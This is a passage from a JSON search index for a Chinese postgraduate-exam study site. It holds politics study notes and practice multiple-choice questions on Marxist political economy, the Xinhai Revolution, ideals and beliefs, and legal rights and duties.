\u4e24\u4f1a\u5f00\u5e55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#34","text":"\u751f\u4ea7\u65b9\u5f0f\u662f\u751f\u4ea7\u529b\u548c\u751f\u4ea7\u5173\u7cfb\u7684\u7edf\u4e00\u3002 \u751f\u4ea7\u529b\u51b3\u5b9a\u751f\u4ea7\u5173\u7cfb\uff0c\u751f\u4ea7\u5173\u7cfb\u53cd\u4f5c\u7528\u4e8e\u751f\u4ea7\u529b\u3002 \u3010\u591a\u9009\u3011\u5386\u53f2\u552f\u7269\u4e3b\u4e49\u8ba4\u4e3a\uff0c\u751f\u4ea7\u529b\u663c\u63a8\u52a8\u793e\u4f1a\u53d1\u5c55\u7684\u6700\u7ec8\u51b3\u5b9a \u529b\u91cf\uff0c\u8868\u73b0\u4e3a( ) A. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u4eba\u7c7b\u81ea\u8eab\u7684\u53d1\u5c55\u7a0b\u5ea6 B. \u751f\u4ea7\u529b\u51b3\u5b9a\u4e86\u9636\u7ea7\u7684\u4ea7\u751f\u3001\u53d1\u5c55\u548c\u6d88\u706d\u7684\u8fc7\u7a0b C. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u4eba\u7684\u5168\u9762\u53d1\u5c55 D. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u751f\u4ea7\u5173\u7cfb\u5e76\u8fdb\u800c\u51b3\u5b9a\u4e86\u5168\u90e8\u793e\u4f1a\u5173\u7cfb \u7b54\u6848 $$ ABCD $$ \u89e3\u6790 \u8003\u5bdf\u751f\u4ea7\u529b\u7684\u793e\u4f1a\u4f5c\u7528\u3002\u4eba\u7c7b\u793e\u4f1a\u53d1\u5c55\u7684\u6700\u7ebf\u51b3\u5b9a\u529b\u91cf\u662f\u751f\u4ea7\u529b\u3002\u8fd9\u662f\u56e0\u4e3a\u751f\u4ea7\u529b\u662f\u6700\u9769\u547d\u3001\u6700\u6d3b\u8dc3\u7684\u56e0\u7d20\uff0c\u751f\u4ea7\u529b\u53d1\u5c55\u8d77\u751f\u4ea7\u5173\u7cfb\u7684\u53d8\u9769\uff0c\u800c\u751f\u4ea7\u5173\u7cfb\u5373\u7ecf\u6d4e\u57fa\u7840\u7684\u53d8\u9769\u53c8\u4f1a\u5f15\u8d77\u4e0a\u5c42\u5efa\u7b51\u7684\u53d8\u5316\uff0c\u4ece\u800c\u5f15\u8d77\u6574\u4e2a\u793e\u4f1a\u7684\u53d8\u5316\u3002\u9009\u9879ABCD\u90fd\u662f\u751f\u4ea7\u529b\u5bf9\u793e\u4f1a\u53d1\u5c55\u8d77\u51b3\u5b9a\u4f5c\u7528\u7684\u5177\u4f53\u8868\u73b0\uff0c\u90fd\u6b63\u786e\u3002","title":"3.4. \u751f\u4ea7\u529b\u4e0e\u751f\u4ea7\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#35","text":"","title":"3.5. \u4e24\u4f1a\u62a5\u544a"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#36","text":"\u7406\u60f3\u6307\u5f15\u65b9\u5411\uff0c\u4fe1\u5ff5\u51b3\u5b9a\u6210\u8d25 \u7406\u60f3\u4fe1\u5ff5\u662f\u594b\u6597\u7684\u76ee\u6807 \u7406\u60f3\u4fe1\u5ff5\u63d0\u4f9b\u524d\u8fdb\u52a8\u529b \u7406\u60f3\u4fe1\u5ff5\u63d0\u9ad8\u7cbe\u795e\u5883\u754c","title":"3.6. \u7406\u60f3\u4fe1\u5ff5\u662f\u7cbe\u795e\u4e4b\u201c\u9499\u201d"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#37","text":"\u4ea7\u751f\u4e86\u65b0\u7684\u529f\u80fd\u548c\u7ed3\u6784 \u5728\u65e7\u4e8b\u7269\u7684\u6bcd\u4f53\u4e2d\u5b55\u80b2 \u7b26\u5408\u4eba\u6c11\u7fa4\u4f17\u7684\u5229\u76ca \u94fe\u63a5\u70ed\u70b9\uff1a\u53bf\u957f\u76f4\u64ad\u5e26\u8d27","title":"3.7. \u65b0\u4e8b\u7269\u4e0d\u53ef\u6218\u80dc\u7684\u539f\u56e0"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/3.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%89%E5%AD%A3/","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e09\u5b63 # \u76ee\u5f55 # \u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e09\u5b63 \u76ee\u5f55 1. \u7b2c\u4e09\u5468 1.1. \u793e\u4f1a\u5b58\u5728\u7684\u7ec4\u6210\u90e8\u5206 1.2. \u8f9b\u4ea5\u9769\u547d 1.3. \u8d44\u672c\u7684\u6709\u673a\u6784\u6210 1.4. \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210 1.5. \u7406\u60f3\u4fe1\u5ff5 1.6. \u6743\u5229\u4e0e\u4e49\u52a1 2. \u7b2c\u56db\u5468 2.1. \u56db\u4e2a\u5168\u9762 1. \u7b2c\u4e09\u5468 # 1.1. \u793e\u4f1a\u5b58\u5728\u7684\u7ec4\u6210\u90e8\u5206 # \u793e\u4f1a\u5b58\u5728\u7684\u4e09\u4e2a\u7ec4\u6210\u90e8\u5206\uff0c\u751f\u4ea7\u65b9\u5f0f\uff08\u51b3\u5b9a\u4f5c\u7528\uff09\uff0c\u5730\u7406\u73af\u5883\u56e0\u7d20\u548c\u4eba\u5de5\u56e0\u7d20 \u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6\uff0c\u8868\u73b0\u4e3a \u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u6027 \u793e\u4f1a\u5386\u53f2\u6027 \u80fd\u52a8\u7684\u53cd\u4f5c\u7528\uff08\u6700\u4e3b\u8981\uff09 1.2. \u8f9b\u4ea5\u9769\u547d # \u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5b8c\u6210\u53cd\u5e1d\u53cd\u5c01\u5efa\u7684\u9769\u547d\u4efb\u52a1 \u7b2c\u4e00\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5f7b\u5e95\u7684\u53cd\u5e1d\u7eb2\u9886\uff0c\u9769\u547d\u515a\u4eba\u751a\u81f3\u5bf9\u5e1d\u56fd\u4e3b\u4e49\u8fd8\u62b1\u6709\u5929\u771f\u7684\u5e7b\u60f3\uff0c\u4f01\u56fe\u5f97\u5230\u5e1d\u56fd\u4e3b\u4e49\u7684\u627f\u8ba4\u3002\u9769\u547d\u540e\uff0c\u5e1d\u56fd\u4e3b\u4e49\u5217\u5f3a\u5171\u540c\u4fb5\u7565\u4e2d\u56fd\u7684\u5c40\u9762\u6ca1\u6709\u4efb\u4f55\u6539\u53d8\u3002 \u7b2c\u4e8c\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u5f7b\u5e95\u7684\u53cd\u5bf9\u5c01\u5efa\u571f\u5730\u6240\u6709\u5236\u7684\u7eb2\u9886\uff0c\u6ca1\u6709\u89e3\u51b3\u519c\u6c11\u7684\u571f\u5730\u95ee\u9898\u3002\u201c\u5e73\u5747\u5730\u6743\u201d\u7684\u4e3b\u5f20\u672a\u80fd\u5b9e\u884c\uff0c\u65e0\u6cd5\u8c03\u52a8\u519c\u6c11\u9636\u7ea7\u7684\u9769\u547d\u79ef\u6781\u6027\u3002 \u7b2c\u4e09\uff0c\u9769\u547d\u7684\u80dc\u5229\u679c\u5b9e\u88ab\u8881\u4e16\u51ef\u7a83\u53d6\uff0c\u800c\u8881\u4e16\u51ef\u662f\u4e00\u4e2a\u5c01\u5efa\u519b\u9600\uff0c\u53c8\u662f\u4e00\u4e2a\u5e1d\u56fd\u4e3b\u4e49\u6276\u690d\u7684\u65b0\u7684\u4ee3\u7406\u4eba\uff0c\u65f6\u65f6\u5904\u5904\u4ee5\u5efa\u7acb\u5c01\u5efa\u4e13\u5236\u7edf\u6cbb\uff0c\u51fa\u5356\u6c11\u65cf\u5229\u76ca\u4e3a\u5df1\u4efb\uff0c\u65e2\u662f\u5c01\u5efa\u4e3b\u4e49\u7684\u4ee3\u8a00\u4eba\uff0c\u53c8\u662f\u5e1d\u56fd\u4e3b\u4e49\u7684\u4ee3\u7406\u4eba\u3002 \u603b\u4e4b\uff0c\u8f9b\u4ea5\u9769\u547d\u6ca1\u6709\u6539\u53d8\u4e2d\u56fd\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\u7684\u6027\u8d28\uff0c\u6ca1\u6709\u5b8c\u6210\u53cd\u5e1d\u53cd\u5c01\u5efa\u7684\u9769\u547d\u4efb\u52a1\u3002 1.3. \u8d44\u672c\u7684\u6709\u673a\u6784\u6210 # \u8d44\u672c\u5bb6\u5e0c\u671b\u83b7\u53d6\u66f4\u9ad8\u7684\u5229\u6da6\uff0c\u5219 c \u56fa\u5b9a\u8d44\u672c\u6bd4\u4f8b\u589e\u52a0 v \u53ef\u53d8\u8d44\u672c\u6bd4\u4f8b\u51cf\u5c11 \u4ece\u800c\u5bfc\u81f4\u8d44\u672c\u6709\u673a\u6784\u6210 c/v \u63d0\u9ad8\u3002\u6709\u673a\u6784\u6210\u63d0\u9ad8\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u673a\u5668\u6362\u4eba\uff0c\u5bfc\u81f4\u4eba\u53e3\u76f8\u5bf9\u8fc7\u5269\u3002 \u793e\u4f1a\u589e\u957f\u8d22\u5bcc\u548c\u6d88\u9664\u8d2b\u56f0\u7684\u6839\u672c\u9014\u5f84\u662f\u53d1\u5c55\u751f\u4ea7\u529b\uff0c\u6d88\u706d\u8d44\u672c\u4e3b\u4e49\uff0c\u8fdb\u5165\u5171\u4ea7\u4e3b\u4e49\u793e\u4f1a\u3002 1.4. \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210 # \u4e0d\u53d8\u8d44\u672c \uff1a\u4e0d\u53d8\u8d44\u672c\u662f\u6307\u5728\u5269\u4f59\u4ef7\u503c\u751f\u4ea7\u8fc7\u7a0b\u4e2d\u8f6c\u53d8\u4e3a\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\uff08\u7528\u5b57\u6bcdC\u8868\u793a\uff09\uff0c\u5373\u4ee5\u751f\u4ea7\u8d44\u6599\u5f62\u6001\u5b58\u5728\u7684\u8d44\u672c\uff0c\u7ecf\u8fc7\u751f\u4ea7\u8fc7\u7a0b\uff0c\u5b83\u7684\u4ef7\u503c\u968f\u7740\u7269\u8d28\u5f62\u6001\u7684\u6539\u53d8\uff0c\u8f6c\u79fb\u5230\u65b0\u4ea7\u54c1\u4e2d\u53bb\uff0c\u6ca1\u6709\u53d1\u751f\u4efb\u4f55\u4ef7\u503c\u91cf\u7684\u53d8\u5316\uff0c\u4ef7\u503c\u4e0d\u4f1a\u589e\u503c\u3002 \u8d44\u672c\u5bb6\u7528\u4e8e\u8d2d\u4e70\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\u3002\u751f\u4ea7\u8d44\u6599\u5728\u751f\u4ea7\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u662f\u5c06\u5176\u4ef7\u503c\u8f6c\u79fb\u5230\u4ea7\u54c1\u4e2d\u53bb\uff0c\u4e0d\u6539\u53d8\u539f\u6709\u7684\u4ef7\u503c\u91cf\uff0c\u6545\u8d2d\u4e70\u751f\u4ea7\u8d44\u6599\u7684\u90a3\u90e8\u5206\u8d44\u672c\u79f0\u4e3a\u4e0d\u53d8\u8d44\u672c\u3002 \u53ef\u53d8\u8d44\u672c \uff1a\u53ef\u53d8\u8d44\u672c(V)\u6307\u7684\u662f\u8d44\u672c\u5bb6\u7528\u4e8e\u8d2d\u4e70\u52b3\u52a8\u529b\u7684\u90a3\u4e00\u90e8\u5206\u8d44\u672c\u3002\u52b3\u52a8\u529b\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u4ec5\u80fd\u591f\u521b\u9020\u51fa\u8865\u507f\u52b3\u52a8\u529b\u4ef7\u503c\u7684\u4ef7\u503c\uff0c\u800c\u4e14\u80fd\u521b\u9020\u51fa\u5269\u4f59\u4ef7\u503c\uff0c\u4f7f\u8d44\u672c\u589e\u503c\u3002\u8fd9\u4e2a\u5269\u4f59\u4ef7\u503c\u672c\u8eab\u662f\u53ef\u53d8\u5316\u7684\uff0c\u4ece\u800c\u8f6c\u5316\u4e3a\u52b3\u52a8\u529b\u7684\u90a3\u90e8\u5206\u8d44\u672c\u5728\u751f\u4ea7\u8fc7\u7a0b\u4e2d\u6539\u53d8\u81ea\u5df1\u7684\u4ef7\u503c\u91cf\uff0c\u9a6c\u514b\u601d\u79f0\u4e4b\u4e3a\u53ef\u53d8\u8d44\u672c\u3002\u8d44\u4ea7\u9636\u7ea7\u7ecf\u6d4e\u5b66\u5bb6\u53ea\u627f\u8ba4\u56fa\u5b9a\u8d44\u672c\u548c\u6d41\u52a8\u8d44\u672c\u7684\u5212\u5206\uff0c\u800c\u4e0d\u627f\u8ba4\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u7684\u5212\u5206\u3002 \u8d44\u672c\u4ef7\u503c\u6784\u6210 (value composition of capital) \u662f\u6307\u8d44\u672c\u5728\u4ef7\u503c\u5f62\u6001\u4e0a\u7531\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u6784\u6210\u7684\u6570\u91cf\u6bd4\u4f8b\u3002\u4ea7\u4e1a\u8d44\u672c\u5bb6\u7528\u4e8e\u751f\u4ea7\u7684\u8d44\u672c\uff0c\u4ece\u4ef7\u503c\u5f62\u6001\u6765\u770b,\u8868\u73b0\u4e3a\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u548c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e24\u4e2a\u90e8\u5206,\u4e5f\u5c31\u662f\u7531\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u7ec4\u6210\u3002\u9a6c\u514b\u601d\u628a\u4e0d\u53d8\u8d44\u672c\u548c\u53ef\u53d8\u8d44\u672c\u6240\u6784\u6210\u7684\u8fd9\u79cd\u6bd4\u4f8b\u5173\u7cfb\uff0c\u79f0\u4e3a\u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210\u3002 \u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\uff0c\u867d\u7136\u4e00\u822c\u5730\u662f\u8d44\u672c\u6280\u672f\u6784\u6210\u53d8\u5316\u7684\u53cd\u6620\uff0c\u4f46\u662f\uff0c\u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\uff0c\u53ea\u662f\u8fd1\u4f3c\u5730\u3001\u800c\u4e0d\u662f\u5b8c\u5168\u5730\u53cd\u6620\u8d44\u672c\u6280\u672f\u6784\u6210\u7684\u53d8\u5316\u3002 \u4ef7\u503c\u6784\u6210\u672a\u53d8\u5316\u7684\u60c5\u51b5 \u5f53\u8d44\u672c\u7684\u6280\u672f\u6784\u6210\u5e76\u672a\u53d8\u5316\uff0c\u800c\u751f\u4ea7\u8d44\u6599\u540c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u548c\u4ef7\u683c\u5374\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u5f15\u8d77\u8d44\u672c\u4ef7\u503c\u6784\u6210\u7684\u53d8\u5316\u3002\u5982\u679c\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e0d\u53d8\uff1b\u6216\u8005\u751f\u4ea7\u8d44\u6599\u7684\u4ef7\u503c\u4e0d\u53d8\uff0c\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u53d1\u751f\u4e86\u53d8\u5316\uff1b\u6216\u8005\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u90fd\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4f46\u53d8\u5316\u7684\u7a0b\u5ea6\u4e0d\u540c\uff0c\u5176\u7ed3\u679c\u90fd\u4f1a\u5f15\u8d77\u8d44\u672c\u4ef7\u503c\u6784\u6210\u53d1\u751f\u53d8\u5316\u3002 \u4ef7\u503c\u6784\u6210\u53d1\u751f\u53d8\u5316\u7684\u60c5\u51b5 \u5f53\u8d44\u672c\u6280\u672f\u6784\u6210\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u4e00\u5b9a\u6570\u91cf\u7684\u751f\u4ea7\u8d44\u6599\u548c\u4f7f\u7528\u8fd9\u4e9b\u751f\u4ea7\u8d44\u6599\u6240\u5fc5\u9700\u7684\u52b3\u52a8\u529b\u6570\u91cf\u4e4b\u95f4\u7684\u6bd4\u4f8b\u53d1\u751f\u4e86\u53d8\u5316,\u5982\u679c\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u7684\u8fd9\u79cd\u6570\u91cf\u4e0a\u7684\u53d8\u5316,\u88ab\u751f\u4ea7\u8d44\u6599\u548c\u52b3\u52a8\u529b\u4ef7\u503c\u4e0a\u7684\u76f8\u53cd\u53d8\u5316\u6240\u5b8c\u5168\u62b5\u6d88\u6216\u90e8\u5206\u62b5\u6d88,\u5219\u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210\u5c31\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316,\u6216\u4e0d\u4f1a\u53d1\u751f\u76f8\u5e94\u7684\u53d8\u5316\u3002 \u5e74\u4efd \u6bcf\u4e00\u96c7\u5458\u5e73\u5747\u88c5\u5907\u7684\u8d44\u4ea7\uff08\u7f8e\u5143\uff09 \u6bcf\u4e00\u96c7\u5458\u5e73\u5747\u5e74\u5de5\u8d44\uff08\u7f8e\u5143\uff09 \u8d44\u672c\u7684\u4ef7\u503c\u6784\u6210(c:v) \u884c\u4e1a\u5e73\u5747\u80a1\u672c\u5229\u6da6\u7387\uff08%\uff09 1960 15,511 5,342 71.7:28.3 9.1% 1967 19,192 6,879 73.6:26.4 11.3% 1970 24,086 8,153 74.7:25.3 9.5% 1975 37,929 11,905 76.1:23.9 11.6% 1980 55,505 17,974 75.5:24.5 14.4% 1985 79,190 24,547 76.3:23.7 11.5% 1960-1985\u53d8\u5316\uff08%\uff09 510% 459.5% \u8d44\u672c\u6280\u672f\u6784\u6210\u7684\u53d8\u5316\uff0c\u4e00\u822c\u90fd\u662f\u7531\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u53d8\u5316\u800c\u5f15\u8d77\u7684 \u3002\u968f\u7740\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8\uff0c\u6bcf\u4e2a\u5de5\u4eba\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u6240\u4f7f\u7528\u7684\u751f\u4ea7\u8d44\u6599\u7684\u6570\u91cf\u76f8\u5e94\u589e\u591a\uff0c\u8d44\u672c\u6280\u672f\u6784\u6210\u4e5f\u4f1a\u63d0\u9ad8\u3002\u4f46\u662f,\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8,\u53c8\u4f1a\u5f15\u8d77\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u7684\u4e0b\u964d\uff0c\u56e0\u800c \u5728\u52b3\u52a8\u751f\u4ea7\u7387\u63d0\u9ad8\u7684\u540c\u65f6 \uff0c\u4e00\u5b9a\u6570\u91cf\u7684\u52b3\u52a8\u529b\u6240\u4f7f\u7528\u7684\u751f\u4ea7\u8d44\u6599\u6570\u91cf\u867d\u7136\u589e\u591a\uff0c\u4f46\u662f\u7531\u4e8e\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u7684\u4e0b\u964d\uff0c \u8d44\u672c\u4ef7\u503c\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6\uff0c\u8981\u5c0f\u4e8e\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6 \u3002 \u540c\u65f6\uff0c\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u7684\u63d0\u9ad8\uff0c\u53c8\u4f1a\u5f15\u8d77\u751f\u6d3b\u8d44\u6599\u7684\u4ef7\u503c\u4e0b\u964d\uff0c\u4ece\u800c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u4e5f\u4f1a\u964d\u4f4e\uff0c\u8fd9\u6837\uff0c\u53c8\u5bfc\u81f4\u8d44\u672c\u4ef7\u503c\u6784\u6210\u6709\u6240\u63d0\u9ad8 \u3002\u7136\u800c\uff0c\u52b3\u52a8\u529b\u7684\u4ef7\u503c\u8981\u53d7\u5230\u5404\u79cd\u793e\u4f1a\u5386\u53f2\u548c\u9053\u5fb7\u56e0\u7d20\u7684\u5236\u7ea6\u3002\u968f\u7740\u793e\u4f1a\u7ecf\u6d4e\u7684\u53d1\u5c55\u548c\u7269\u8d28\u6587\u5316\u751f\u6d3b\u6c34\u5e73\u7684\u63d0\u9ad8\uff0c\u52b3\u52a8\u529b\u4ef7\u503c\u6240\u4ee3\u8868\u7684\u751f\u6d3b\u8d44\u6599\u7684\u6570\u91cf\u9010\u6b65\u6709\u6240\u589e\u591a\uff0c\u4ece\u800c\u4f1a\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u904f\u5236\u52b3\u52a8\u529b\u4ef7\u503c\u7684\u4e0b\u964d\u901f\u5ea6\u3002\u8fd9\u6837\uff0c\u5728\u793e\u4f1a\u52b3\u52a8\u751f\u4ea7\u7387\u63d0\u9ad8\u65f6\uff0c\u52b3\u52a8\u529b\u4ef7\u503c\u5c3d\u7ba1\u6709\u6240\u4e0b\u964d\uff0c\u4f46\u662f\uff0c\u4e0b\u964d\u7684\u901f\u5ea6\u4e00\u822c\u8981\u6162\u4e8e\u751f\u4ea7\u8d44\u6599\u4ef7\u503c\u4e0b\u964d\u7684\u901f\u5ea6\u3002 \u6240\u4ee5\uff0c\u5f53\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u65f6\uff0c\u8d44\u672c\u4ef7\u503c\u6784\u6210\u4ecd\u4f1a\u63d0\u9ad8\uff0c\u4e0d\u8fc7\uff0c\u5b83\u63d0\u9ad8\u7684\u7a0b\u5ea6\u548c\u901f\u5ea6\uff0c\u8981\u5927\u5927\u4f4e\u4e8e\u8d44\u672c\u6280\u672f\u6784\u6210\u63d0\u9ad8\u7684\u7a0b\u5ea6\u548c\u901f\u5ea6 \u3002 1.5. \u7406\u60f3\u4fe1\u5ff5 # \u7406\u60f3\u4f5c\u4e3a\u4e00\u79cd\u7cbe\u795e\u73b0\u8c61\uff0c\u662f\u4eba\u7c7b\u793e\u4f1a\u65f6\u95f4\u7684\u4ea7\u7269\u3002\u7406\u60f3\u6e90\u4e8e\u73b0\u5b9e\uff0c\u53c8\u8d85\u8d8a\u73b0\u5b9e\uff0c\u5728\u73b0\u5b9e\u4e2d\u53c8\u591a\u79cd\u7c7b\u578b\u3002\u4ece\u5c42\u6b21\u4e0a\u5212\u5206\uff0c\u7406\u60f3\u6709\uff1a A. \u4e2a\u4eba\u7406\u60f3\u4e0e\u793e\u4f1a\u7406\u60f3 B. \u9053\u5fb7\u7406\u60f3\u548c\u653f\u6cbb\u7406\u60f3 C. \u751f\u6d3b\u7406\u60f3\u548c\u804c\u4e1a\u7406\u60f3 D. \u5d07\u9ad8\u7406\u60f3\u548c\u4e00\u822c\u7406\u60f3 \u7b54\u6848 \u7b54\u6848\uff1aD \u4ece\u5c42\u6b21\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u5d07\u9ad8\u7406\u60f3\u548c\u4e00\u822c\u7406\u60f3\u3002 \u4ece\u5185\u5bb9\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u9053\u5fb7\u7406\u60f3\u3001\u653f\u6cbb\u7406\u60f3\uff0c\u751f\u6d3b\u7406\u60f3\u548c\u804c\u4e1a\u7406\u60f3\u3002 \u4ece\u4e3b\u4f53\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e2a\u4eba\u7406\u60f3\u4e0e\u793e\u4f1a\u7406\u60f3\u3002 \u4ece\u65f6\u95f4\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u8fd1\u671f\u7406\u60f3\u548c\u8fdc\u671f\u7406\u60f3\u3002 \u7406\u60f3\u548c\u4fe1\u5ff5\u603b\u662f\u76f8\u4e92\u4f9d\u5b58\uff0c\u7406\u60f3\u662f\u4fe1\u5ff5\u6240\u6307\u7684\u5bf9\u8c61\uff0c\u4fe1\u5ff5\u5219\u662f\u7406\u60f3\u5b9e\u73b0\u7684\u4fdd\u969c\u3002 \u4fe1\u4ef0\u662f\u6700\u9ad8\u5c42\u6b21\u7684\u4fe1\u5ff5\uff0c\u5177\u6709\u6700\u5927\u7684\u7edf\u6444\u529b\u3002 1.6. \u6743\u5229\u4e0e\u4e49\u52a1 # \u3010\u591a\u9009\u3011\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5c31\u50cf\u4e00\u679a\u786c\u5e01\u7684\u4e24\u9762\uff0c\u5bc6\u4e0d\u53ef\u5206\u3002\u4e8c\u8005\u4e4b\u95f4\u5173\u7cfb\u7684\u6b63\u786e\u8868\u8ff0\u662f A. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u4e92\u76f8\u4f9d\u5b58\u7684\u5173\u7cfb B. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u76ee\u7684\u4e0e\u624b\u6bb5\u7684\u5173\u7cfb C. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u987a\u5e8f\u6027 D. \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u5177\u6709\u4e8c\u91cd\u6027 \u7b54\u6848 \u7b54\u6848\uff1aABD \u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u7684\u5173\u7cfb\uff0c\u5c31\u50cf\u4e00\u679a\u786c\u5e01\u7684\u4e24\u9762\uff0c\u4e0d\u53ef\u5206\u5272\uff0c\u76f8\u4e92\u4f9d\u5b58\u3002 \u9996\u5148\uff0c\u6cd5\u5f8b\u6743\u5229\u548c\u6cd5\u5f8b\u4e49\u52a1\u662f\u76f8\u4e92\u4f9d\u5b58\u7684\u5173\u7cfb\uff0c\u6cd5\u5f8b\u6743\u5229\u7684\u5b9e\u73b0\u5fc5\u987b\u4ee5\u76f8\u5e94\u6cd5\u5f8b\u4e49\u52a1\u7684\u5c65\u884c\u4e3a\u6761\u4ef6\u3002 \u5176\u6b21\uff0c\u6cd5\u5f8b\u6743\u5229\u4e0e\u6cd5\u5f8b\u4e49\u52a1\u662f\u76ee\u7684\u548c\u624b\u6bb5\u7684\u5173\u7cfb\u3002\u79bb\u5f00\u4e86\u6cd5\u5f8b\u6743\u5229\uff0c\u6cd5\u5f8b\u4e49\u52a1\u5c31\u5931\u53bb\u4e86\u5c65\u884c\u7684\u4ef7\u503c\u548c\u52a8\u529b\uff1b\u79bb\u5f00\u4e86\u6cd5\u5f8b\u4e49\u52a1\uff0c\u6cd5\u5f8b\u6743\u5229\u4e5f\u5f62\u540c\u865a\u8bbe\u3002\u5982\u8d22\u4ea7\u6743\u548c\u4e0d\u5f97\u4fb5\u5bb3\u4ed6\u4eba\u8d22\u4ea7\u7684\u4e49\u52a1\u3002 